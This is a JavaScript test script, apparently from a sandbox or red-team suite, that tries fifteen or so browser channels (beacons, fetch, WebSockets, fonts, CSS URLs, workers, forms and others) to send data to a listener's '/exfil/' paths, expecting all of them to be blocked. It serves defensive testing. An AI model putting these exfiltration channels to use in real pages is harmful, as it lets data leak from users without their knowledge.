// Check 8: every way a page could send something out, each to the wall
// listener, which must hear nothing. It reports twice: before and after
// the ways that would take the frame somewhere else (a link, a form).
;(async () => {
  const info = await RT.info
  const at = (what) => `${info.wall}/exfil/${what}`
  const add = (tag, props) => document.body.appendChild(Object.assign(document.createElement(tag), props))
  const out = {}
  out.beacon = await RT.attempt(() => navigator.sendBeacon(at("beacon"), "x"), 2000)
  out.image = RT.post(() => {
    new Image().src = at("image")
  })
  out.fetch = await RT.attempt(() => fetch(at("fetch"), { method: "POST", body: "x" }).then((r) => r.status), 2000)
  out.xhr = await RT.attempt(
    () =>
      new Promise((resolve, reject) => {
        const x = new XMLHttpRequest()
        x.open("GET", at("xhr"))
        x.onload = () => resolve(x.status)
        x.onerror = () => reject(new TypeError("xhr failed"))
        x.send()
      }),
    2000,
  )
  out.webSocket = RT.post(() => new WebSocket(`${info.wall.replace("http:", "ws:")}/exfil/ws`))
  out.eventSource = RT.post(() => new EventSource(at("sse")))
  out.stylesheet = RT.post(() => add("link", { rel: "stylesheet", href: at("css") }))
  out.cssUrl = RT.post(() => {
    add("div", {}).style.backgroundImage = `url(${at("css-url")})`
  })
  out.font = await RT.attempt(() => new FontFace("redteam", `url(${at("font")})`).load(), 2000)
  out.video = RT.post(() => add("video", { src: at("video") }))
  out.audio = RT.post(() => add("audio", { src: at("audio") }))
  out.script = RT.post(() => add("script", { src: at("script") }))
  out.worker = RT.post(() => new Worker(at("worker")))
  out.open = await RT.attempt(() => String(window.open(at("open"))), 2000)
  await RT.wait(500)
  await RT.report(out)
  const then = {}
  then.link = RT.post(() => add("a", { href: at("link"), target: "_blank" }).click())
  then.form = RT.post(() => {
    const form = add("form", { action: at("form"), method: "post" })
    form.append(Object.assign(document.createElement("input"), { name: "x", value: "1" }))
    form.submit()
  })
  await RT.wait(1500)
  await RT.report(then)
})()
